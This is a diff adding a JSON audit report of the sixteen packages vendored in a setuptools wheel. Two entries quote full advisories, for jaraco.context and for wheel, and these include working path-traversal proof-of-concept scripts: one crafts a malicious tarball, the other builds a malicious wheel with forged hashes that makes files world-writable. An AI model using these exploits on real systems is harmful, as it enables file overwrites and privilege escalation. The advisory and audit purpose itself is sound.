@@ -1,0 +1,261 @@
+{
+  "checked_utc": "2026-10-20T17:26:10.439017+00:00",
+  "format": "buddha.review.nb02c3b-bundled-advisories.v1",
+  "packages": [
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/autocommand-2.2.2.dist-info/METADATA",
+        "sha256": "3800d9b91dceea2065a6ed6279383362e97ac38b8e56b9343f404ee531860099"
+      },
+      "name": "autocommand",
+      "response_bytes": 17506,
+      "response_sha256": "7d4b5e769285aa580f6bc747f82328bfcdd503a2d2fe76865e3df15ffa196948",
+      "source_url": "https://pypi.org/pypi/autocommand/2.2.2/json",
+      "version": "2.2.2",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/backports.tarfile-1.2.0.dist-info/METADATA",
+        "sha256": "8215c54ead77d9dc5a108a25c6bdc72b5999aa6f62c9499a440359412afa5a51"
+      },
+      "name": "backports-tarfile",
+      "response_bytes": 4094,
+      "response_sha256": "7cd517dda79f81cf7c49832a083faf7b5f51ad280d6d4936609e850882f07f70",
+      "source_url": "https://pypi.org/pypi/backports-tarfile/1.2.0/json",
+      "version": "1.2.0",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/importlib_metadata-8.0.0.dist-info/METADATA",
+        "sha256": "6a7b90effee1e09d5b484cdf7232016a43e2d9cc9543bcbb8e494b1ec05e1f59"
+      },
+      "name": "importlib-metadata",
+      "response_bytes": 6730,
+      "response_sha256": "01ca993c7f76ea0e21f24c7e51d903dbb671195959a560ba3a38db6aca2ccdce",
+      "source_url": "https://pypi.org/pypi/importlib-metadata/8.0.0/json",
+      "version": "8.0.0",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/inflect-7.3.1.dist-info/METADATA",
+        "sha256": "66030d634580651b3e53cc19895d9231f8d22aa06b327817c8332cfc20303308"
+      },
+      "name": "inflect",
+      "response_bytes": 24144,
+      "response_sha256": "0373209a87c837be30d6a379baa995c7ec4d181a406a95fc01357082b5af06ac",
+      "source_url": "https://pypi.org/pypi/inflect/7.3.1/json",
+      "version": "7.3.1",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/jaraco.collections-5.1.0.dist-info/METADATA",
+        "sha256": "20c51a96236c0395f53b1f4c5d458e6a0721e51e16c1bff733b7aba76f5d06d8"
+      },
+      "name": "jaraco-collections",
+      "response_bytes": 5965,
+      "response_sha256": "32017e78109d2c4a14fa733ce755f309e19b818be1b3a794d65ef7cdb1c61c4a",
+      "source_url": "https://pypi.org/pypi/jaraco-collections/5.1.0/json",
+      "version": "5.1.0",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/jaraco.context-5.3.0.dist-info/METADATA",
+        "sha256": "c43b60b897a3d2d37d8845c252fc44261d9aef171e21154111a9012d2afffed6"
+      },
+      "name": "jaraco-context",
+      "response_bytes": 17756,
+      "response_sha256": "243d5c9a0de51a2ef962a2440ab5b05225c822bbdfd2a0ae5f43aa9aa1f0ef4f",
+      "source_url": "https://pypi.org/pypi/jaraco-context/5.3.0/json",
+      "version": "5.3.0",
+      "vulnerabilities": [
+        {
+          "aliases": [
+            "CVE-2026-23949"
+          ],
+          "details": "### Summary\nThere is a Zip Slip path traversal vulnerability in the jaraco.context package affecting setuptools as well, in `jaraco.context.tarball()` function. The vulnerability may allow attackers to extract files outside the intended extraction directory when malicious tar archives are processed.\nThe strip_first_component filter splits the path on the first `/` and extracts the second component, while allowing `../` sequences. Paths like `dummy_dir/../../etc/passwd` become `../../etc/passwd`.\nNote that this suffers from a nested tarball attack as well with multi-level tar files such as `dummy_dir/inner.tar.gz`, where the inner.tar.gz includes a traversal `dummy_dir/../../config/.env` that also gets translated to `../../config/.env`.\n\nThe code can be found:\n- https://github.com/jaraco/jaraco.context/blob/main/jaraco/context/__init__.py#L74-L91\n- https://github.com/pypa/setuptools/blob/main/setuptools/_vendor/jaraco/context.py#L55-L76 (inherited)\n\nThis report was also sent to setuptools maintainers and they asked some questions regarding this.\n\nThe lengthy answer is:\n\nThe vulnerability seems to be the `strip_first_component` filter function, not the tarball function itself and has the same behavior on any tested Python version locally (from 11 to 14, as I noticed that there is a backports conditional for the tarball).\nThe stock tarball for Python 3.12+ is considered not vulnerable (until proven otherwise \ud83d\ude04) but here the custom filter seems to overwrite the native filtering and introduces the issue - while overwriting the updated secure Python 3.12+ behavior and giving a false sense of sanitization.\n\nThe short answer is:\n\nIf we are talking about Python < 3.12 the tarball and jaraco implementations /  behaviors are relatively the same but for Python 3.12+ the jaraco implementation overwrites the native tarball protection.\n\nSampled tests:\n<img width=\"1634\" height=\"245\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ce6c0de6-bb53-4c2b-818a-d77e28d2fbeb\" />\n\n### Details\n\nThe flow with setuptools in the mix:\n```\nsetuptools._vendor.jaraco.context.tarball() > req = urlopen(url) > with tarfile.open(fileobj=req, mode='r|*') as tf: > tf.extractall(path=target_dir, filter=strip_first_component) > strip_first_component (Vulnerable)\n```\n\n### PoC\n\nThis was tested on multiple Python versions > 11 on a Debian GNU 12 (bookworm).\nYou can run this directly after having all the dependencies:\n```py\n#!/usr/bin/env python3\nimport tarfile\nimport io\nimport os\nimport sys\nimport shutil\nimport tempfile\nfrom setuptools._vendor.jaraco.context import strip_first_component\n\n\ndef create_malicious_tarball(traversal_to_root: str):\n    tar_data = io.BytesIO()\n    with tarfile.open(fileobj=tar_data, mode='w') as tar:\n        # Create a malicious file path with traversal sequences\n        malicious_files = [\n            # Attempt 1: Simple traversal to /tmp\n            {\n                'path': f'dummy_dir/{traversal_to_root}tmp/pwned_by_zipslip.txt',\n                'content': b'[ZIPSLIP] File written to /tmp via path traversal!',\n                'name': 'pwned_via_tmp'\n            },\n            # Attempt 2: Try to write to home directory\n            {\n                'path': f'dummy_dir/{traversal_to_root}home/pwned_home.txt',\n                'content': b'[ZIPSLIP] Attempted write to home directory',\n                'name': 'pwned_via_home'\n            },\n            # Attempt 3: Try to write to current directory parent\n            {\n                'path': 'dummy_dir/../escaped.txt',\n                'content': b'[ZIPSLIP] File in parent directory!',\n                'name': 'pwned_escaped'\n            },\n            # Attempt 4: Legitimate file for comparison\n            {\n                'path': 'dummy_dir/legitimate_file.txt',\n                'content': b'This file stays in target directory',\n                'name': 'legitimate'\n            }\n        ]\n        for file_info in malicious_files:\n            content = file_info['content']\n            tarinfo = tarfile.TarInfo(name=file_info['path'])\n            tarinfo.size = len(content)\n            tar.addfile(tarinfo, io.BytesIO(content))\n\n    tar_data.seek(0)\n    return tar_data\n\n\ndef exploit_zipslip():\n    print(\\\"[*] Target: setuptools._vendor.jaraco.context.tarball()\\\")\n\n    # Create temporary directory for extraction\n    temp_base = tempfile.mkdtemp(prefix=\\\"zipslip_test_\\\")\n    target_dir = os.path.join(temp_base, \\\"extraction_target\\\")\n\n    try:\n        os.mkdir(target_dir)\n        print(f\\\"[+] Created target extraction directory: {target_dir}\\\")\n\n        target_dir_abs = os.path.abspath(target_dir)\n        print(target_dir_abs)\n        depth_to_root = len([p for p in target_dir_abs.split(os.sep) if p])\n        traversal_to_root = \\\"../\\\" * depth_to_root\n        print(f\\\"[+] Using traversal_to_root prefix: {traversal_to_root!r}\\\")\n\n        # Create malicious tarball\n        print(\\\"[*] Creating malicious tar archive...\\\")\n        tar_data = create_malicious_tarball(traversal_to_root)\n\n        try:\n            with tarfile.open(fileobj=tar_data, mode='r') as tf:\n                for member in tf:\n                    # Apply the ACTUAL vulnerable function from setuptools\n                    processed_member = strip_first_component(member, target_dir)\n                    print(f\\\"[*] Extracting: {member.name:40} -> {processed_member.name}\\\")\n\n                    # Extract to target directory\n                    try:\n                        tf.extract(processed_member, path=target_dir)\n                        print(f\\\"    \u2713 Extracted successfully\\\")\n                    except (PermissionError, FileNotFoundError, OSError) as e:\n                        print(f\\\"    ! {type(e).__name__}: Path traversal ATTEMPTED\\\")\n        except Exception as e:\n            print(f\\\"[!] Extraction raised exception: {type(e).__name__}: {e}\\\")\n\n        # Check results\n        print(\\\"[*] Checking for extracted files...\\\")\n\n        # Check target directory\n        print(f\\\"[*] Files in target directory ({target_dir}):\\\")\n        if os.path.exists(target_dir):\n            for root, _, files in os.walk(target_dir):\n                level = root.replace(target_dir, '').count(os.sep)\n                indent = ' ' * 2 * level\n                print(f\\\"{indent}{os.path.basename(root)}/\\\")\n                subindent = ' ' * 2 * (level + 1)\n                for file in files:\n                    filepath = os.path.join(root, file)\n                    try:\n                        with open(filepath, 'r') as f:\n                            content = f.read()[:50]\n                        print(f\\\"{subindent}{file}\\\")\n                        print(f\\\"{subindent}  \u2514\u2500 {content}...\\\")\n                    except:\n                        print(f\\\"{subindent}{file} (binary)\\\")\n        else:\n            print(f\\\"[!] Target directory not found!\\\")\n\n        print()\n        print(\\\"[*] Checking for traversal attempts...\\\")\n        print()\n\n        # Check if files escaped\n        traversal_attempts = [\n            (\\\"/tmp/pwned_by_zipslip.txt\\\", \\\"Escape to /tmp\\\"),\n            (os.path.expanduser(\\\"~/pwned_home.txt\\\"), \\\"Escape to home\\\"),\n            (os.path.join(temp_base, \\\"escaped.txt\\\"), \\\"Escape to parent\\\"),\n        ]\n\n        escaped = False\n        for check_path, description in traversal_attempts:\n            if os.path.exists(check_path):\n                print(f\\\"[+] Path Traversal Confirmed: {description}\\\")\n                print(f\\\"      File created at: {check_path}\\\")\n                try:\n                    with open(check_path, 'r') as f:\n                        content = f.read()\n                    print(f\\\"      Content: {content}\\\")\n                    print(f\\\"      Removing: {check_path}\\\")\n                    os.remove(check_path)\n                except Exception as e:\n                    print(f\\\"      Error reading: {e}\\\")\n                escaped = True\n            else:\n                print(f\\\"[-] OK: {description} - No escape detected\\\")\n\n        if escaped:\n            print(\\\"[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed!\\\")\n        else:\n            print(\\\"[-] No path traversal detected (mitigation in place)\\\")\n\n    finally:\n        # Cleanup\n        print()\n        print(f\\\"[*] Cleaning up: {temp_base}\\\")\n        try:\n            shutil.rmtree(temp_base)\n        except Exception as e:\n            print(f\\\"[!] Cleanup error: {e}\\\")\n\n\ndef check_python_version():\n    print(f\\\"[+] Python version: {sys.version}\\\")\n    # Python 3.11.4+ added DEFAULT_FILTER\n    if hasattr(tarfile, 'DEFAULT_FILTER'):\n        print(\\\"[+] Python has DEFAULT_FILTER (tarfile security hardening)\\\")\n    else:\n        print(\\\"[!] Python does not have DEFAULT_FILTER (older version)\\\")\n    print()\n\n\nif __name__ == \\\"__main__\\\":\n    check_python_version()\n    exploit_zipslip()\n```\n\nOutput:\n```\n[+] Python version: 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] \n[!] Python does not have DEFAULT_FILTER (older version) \n\n[*] Target: setuptools._vendor.jaraco.context.tarball() \n[+] Created target extraction directory: /tmp/zipslip_test_tnu3qpd5/extraction_target \n[*] Creating malicious tar archive... \n[*] Extracting: ../../tmp/pwned_by_zipslip.txt           -> ../../tmp/pwned_by_zipslip.txt \n    \u2713 Extracted successfully \n[*] Extracting: ../../../../home/pwned_home.txt          -> ../../../../home/pwned_home.txt \n    ! PermissionError: Path traversal ATTEMPTED \n[*] Extracting: ../escaped.txt                           -> ../escaped.txt \n    \u2713 Extracted successfully \n[*] Extracting: legitimate_file.txt                      -> legitimate_file.txt \n    \u2713 Extracted successfully \n[*] Checking for extracted files... \n[*] Files in target directory (/tmp/zipslip_test_tnu3qpd5/extraction_target): \nextraction_target/ \n  legitimate_file.txt \n    \u2514\u2500 This file stays in target directory... \n\n[*] Checking for traversal attempts... \n\n[-] OK: Escape to /tmp - No escape detected \n[-] OK: Escape to home - No escape detected \n[+] Path Traversal Confirmed: Escape to parent \n      File created at: /tmp/zipslip_test_tnu3qpd5/escaped.txt \n      Content: [ZIPSLIP] File in parent directory! \n      Removing: /tmp/zipslip_test_tnu3qpd5/escaped.txt \n[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed! \n\n[*] Cleaning up: /tmp/zipslip_test_tnu3qpd5\n```\n\n### Impact\n\n- Arbitrary file creation in filesystem (HIGH exploitability) - especially if popular packages download tar files remotely and use this package to extract files.\n- Privesc (LOW exploitability)\n- Supply-Chain attack (VARIABLE exploitability) - relevant to the first point.\n\n### Remediation\n\nI guess removing the custom filter is not feasible given the backward compatibility issues that might come up you can use a safer filter `strip_first_component` that skips or sanitizes `../` character sequences since it is already there eg.\n```\nif member.name.startswith('/') or '..' in member.name:\n  raise ValueError(f\\\"Attempted path traversal detected: {member.name}\\\")\n```",
+          "fixed_in": [
+            "6.1.0"
+          ],
+          "id": "GHSA-58pv-8j8x-9vj2",
+          "link": "https://osv.dev/vulnerability/GHSA-58pv-8j8x-9vj2",
+          "source": "osv",
+          "summary": null,
+          "withdrawn": null
+        }
+      ]
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/jaraco.functools-4.0.1.dist-info/METADATA",
+        "sha256": "8b86946900d7fa38dd1102b9c1ebe17a0cb1f09c8b7e29f61f2bda4a4dc51eca"
+      },
+      "name": "jaraco-functools",
+      "response_bytes": 4906,
+      "response_sha256": "73f6f0281cd0941990a0a3fb0cda2a3bdc45b24a349258f29386a87ab1de7630",
+      "source_url": "https://pypi.org/pypi/jaraco-functools/4.0.1/json",
+      "version": "4.0.1",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/jaraco.text-3.12.1.dist-info/METADATA",
+        "sha256": "03359d9ba56231f0ce3e840c7cb5a7db380141218949ccaa78ddbd4dcb965d52"
+      },
+      "name": "jaraco-text",
+      "response_bytes": 5636,
+      "response_sha256": "4574d226269a0d26017f4bb1b886b9c35a0d2caa24574f7fa0a28f384c47af34",
+      "source_url": "https://pypi.org/pypi/jaraco-text/3.12.1/json",
+      "version": "3.12.1",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/more_itertools-10.3.0.dist-info/METADATA",
+        "sha256": "0453bdd0ef9f2cd89540ca63ee8212e73b73809514419dd3037d8fe471f737e0"
+      },
+      "name": "more-itertools",
+      "response_bytes": 38752,
+      "response_sha256": "b06081f5932aee65cbccec887b432e6f9c9b4fc58be1c6ab8329d03875ab254e",
+      "source_url": "https://pypi.org/pypi/more-itertools/10.3.0/json",
+      "version": "10.3.0",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/packaging-24.2.dist-info/METADATA",
+        "sha256": "a211fceacea4e6621f4316364d2d0b7127c00de3856b8062082f9bc5957ea4db"
+      },
+      "name": "packaging",
+      "response_bytes": 5459,
+      "response_sha256": "abe767200651dd31d5239c3bfa6cb61d44aaf01647cdf513ac39e51566b1d3c7",
+      "source_url": "https://pypi.org/pypi/packaging/24.2/json",
+      "version": "24.2",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/platformdirs-4.2.2.dist-info/METADATA",
+        "sha256": "ce6b227b4d46d4cb57474c2022fe57a557933bb89daf4596bdf9b12ac296b869"
+      },
+      "name": "platformdirs",
+      "response_bytes": 13782,
+      "response_sha256": "3b964f6163f5ef9366a622c54f76575a4c6f81f041fd56add75027251025d4e2",
+      "source_url": "https://pypi.org/pypi/platformdirs/4.2.2/json",
+      "version": "4.2.2",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/tomli-2.0.1.dist-info/METADATA",
+        "sha256": "ccf0dc78a98fc0918b5ad67292b1e2c4bed65575a6246cd9d63c914f9942a0f2"
+      },
+      "name": "tomli",
+      "response_bytes": 11243,
+      "response_sha256": "d7a48ed825dedf76832bd0527076f5bdef8eb51e1fe3e034c0d0e5405aa3825a",
+      "source_url": "https://pypi.org/pypi/tomli/2.0.1/json",
+      "version": "2.0.1",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/typeguard-4.3.0.dist-info/METADATA",
+        "sha256": "cf675c1c0a744f08580855390de87cc77d676b312582e8d4cfdb5bb8fd298d21"
+      },
+      "name": "typeguard",
+      "response_bytes": 5684,
+      "response_sha256": "3a02532d43d1293bad011ce8cda082c5482fb1d630c8343253d8b2cf05089d03",
+      "source_url": "https://pypi.org/pypi/typeguard/4.3.0/json",
+      "version": "4.3.0",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/typing_extensions-4.12.2.dist-info/METADATA",
+        "sha256": "05e51021af1c9d86eb8d6c7e37c4cece733d5065b91a6d8389c5690ed440f16d"
+      },
+      "name": "typing-extensions",
+      "response_bytes": 5368,
+      "response_sha256": "c5900b4532b93c4c4df1f92ebda717dfa953dbbe3cc900d8fb303ce66c8a82ee",
+      "source_url": "https://pypi.org/pypi/typing-extensions/4.12.2/json",
+      "version": "4.12.2",
+      "vulnerabilities": []
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/wheel-0.45.1.dist-info/METADATA",
+        "sha256": "98acfce07ee6ee3b31272cde21c4d53918936f434f315dfd2af3886211a09a30"
+      },
+      "name": "wheel",
+      "response_bytes": 12040,
+      "response_sha256": "617c2b62cc17caeef3fc1e10144bd3d5b8dc2fb93bb67a87f2802c2d0a856c32",
+      "source_url": "https://pypi.org/pypi/wheel/0.45.1/json",
+      "version": "0.45.1",
+      "vulnerabilities": [
+        {
+          "aliases": [
+            "CVE-2026-24049"
+          ],
+          "details": "### Summary\n - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  \n - **Root Cause Component:** wheel.cli.unpack.unpack function.  \n - **Affected Packages:**  \n   1. wheel (Upstream source)  \n   2. setuptools (Downstream, vendors wheel)  \n - **Severity:** High (Allows modifying system file permissions).  \n\n### Details  \nThe vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  \n```\n# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)\nfor zinfo in wf.filelist:\n    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile\n\n    # (2) VULNERABILITY:\n    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.\n    # If zinfo.filename contains \"../\", this targets files outside the destination.\n    permissions = zinfo.external_attr >> 16 & 0o777\n    destination.joinpath(zinfo.filename).chmod(permissions)\n```  \n\n### PoC  \nI have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  \n\n**Prerequisites:** pip install setuptools  \n\n**Step 1: Generate the Malicious Wheel (gen_poc.py)**  \nThis script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  \n```\nimport zipfile\nimport hashlib\nimport base64\nimport os\n\ndef urlsafe_b64encode(data):\n    \"\"\"\n    Helper function to encode data using URL-safe Base64 without padding.\n    Required by the Wheel file format specification.\n    \"\"\"\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')\n\ndef get_hash_and_size(data_bytes):\n    \"\"\"\n    Calculates SHA-256 hash and size of the data.\n    These values are required to construct a valid 'RECORD' file,\n    which is used by the 'wheel' library to verify integrity.\n    \"\"\"\n    digest = hashlib.sha256(data_bytes).digest()\n    hash_str = \"sha256=\" + urlsafe_b64encode(digest)\n    return hash_str, str(len(data_bytes))\n\ndef create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):\n    print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")\n\n    # 1. Prepare Standard Metadata Content\n    # These are minimal required contents to make the wheel look legitimate.\n    wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"\n    metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"\n   \n    # 2. Define Malicious Payload (Path Traversal)\n    # The content doesn't matter, but the path does.\n    payload_content = b\"PWNED by Path Traversal\"\n\n    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'\n    # The vulnerability allows 'chmod' to affect this path directly.\n    malicious_path = \"../../poc_target.txt\"\n\n    # 3. Calculate Hashes for Integrity Check Bypass\n    # The 'wheel' library verifies if the file hash matches the RECORD entry.\n    # To bypass this check, we calculate the correct hash for our malicious file.\n    wheel_hash, wheel_size = get_hash_and_size(wheel_content)\n    metadata_hash, metadata_size = get_hash_and_size(metadata_content)\n    payload_hash, payload_size = get_hash_and_size(payload_content)\n\n    # 4. Construct the 'RECORD' File\n    # The RECORD file lists all files in the wheel with their hashes.\n    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.\n    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.\n    record_lines = [\n        f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",\n        f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",\n        f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path\n        \"evil-1.0.dist-info/RECORD,,\"\n    ]\n    record_content = \"\\n\".join(record_lines).encode('utf-8')\n\n    # 5. Build the Zip File\n    with zipfile.ZipFile(filename, \"w\") as zf:\n        # Write standard metadata files\n        zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)\n        zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)\n        zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)\n\n        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file\n        # We need to set specific permission bits to trigger the vulnerability.\n        zinfo = zipfile.ZipInfo(malicious_path)\n       \n        # Set external attributes to 0o777 (rwxrwxrwx)\n        # Upper 16 bits: File type (0o100000 = Regular File)\n        # Lower 16 bits: Permissions (0o777 = World Writable)\n        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.\n        zinfo.external_attr = (0o100000 | 0o777) << 16\n       \n        zf.writestr(zinfo, payload_content)\n\n    print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")\n\nif __name__ == \"__main__\":\n    create_evil_wheel_v4()\n```  \n\n**Step 2: Run the Exploit (exploit.py)**  \n```\nfrom pathlib import Path\nimport sys\n\n# Demonstrating impact on setuptools\ntry:\n    from setuptools._vendor.wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from setuptools\")\nexcept ImportError:\n    from wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from wheel\")\n\n# 1. Setup Target (Read-Only system file simulation)\ntarget = Path(\"poc_target.txt\")\ntarget.write_text(\"SENSITIVE CONFIG\")\ntarget.chmod(0o400) # Read-only\nprint(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")\n\n# 2. Run Vulnerable Unpack\n# The wheel contains \"../../poc_target.txt\".\n# unpack() will extract safely, BUT chmod() will hit the actual target file.\ntry:\n    unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\")\nexcept Exception as e:\n    print(f\"[!] Ignored expected extraction error: {e}\")\n\n# 3. Check Result\nfinal_perms = oct(target.stat().st_mode)[-3:]\nprint(f\"[*] Final Perms: {final_perms}\")\n\nif final_perms == \"777\":\n    print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\")\nelse:\n    print(\"[-] Attack failed.\")\n```  \n\n**result:**  \n<img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />  \n  \n### Impact  \nAttackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  \n\n### Recommended Fix  \nThe unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  \n\n### Suggested Patch:  \n```\n# extract() returns the actual path where the file was written\nextracted_path = wf.extract(zinfo, destination)\n\n# Only apply chmod if a file was actually written\nif extracted_path:\n    permissions = zinfo.external_attr >> 16 & 0o777\n    Path(extracted_path).chmod(permissions)\n```",
+          "fixed_in": [
+            "0.46.2"
+          ],
+          "id": "GHSA-8rrh-rw8j-w5fx",
+          "link": "https://osv.dev/vulnerability/GHSA-8rrh-rw8j-w5fx",
+          "source": "osv",
+          "summary": null,
+          "withdrawn": null
+        }
+      ]
+    },
+    {
+      "bundled_metadata": {
+        "artifact": "setuptools-79.0.1-py3-none-any.whl",
+        "artifact_sha256": "e147c0549f27767ba362f9da434eab9c5dc0045d5304feb602a0af001089fc51",
+        "path": "setuptools/_vendor/zipp-3.19.2.dist-info/METADATA",
+        "sha256": "508ae4fe43081c64b0b0a2828588b3a8cc3430c6693d1676662569400b0dfdb1"
+      },
+      "name": "zipp",
+      "response_bytes": 5513,
+      "response_sha256": "34f5cc427713addf7d9c3d25f94f8375a8e844fa25e53991f5f0bcb53c63a39a",
+      "source_url": "https://pypi.org/pypi/zipp/3.19.2/json",
+      "version": "3.19.2",
+      "vulnerabilities": []
+    }
+  ],
+  "scope": "Actual sixteen Setuptools vendored metadata versions; primary PyPI preflight only"
+}
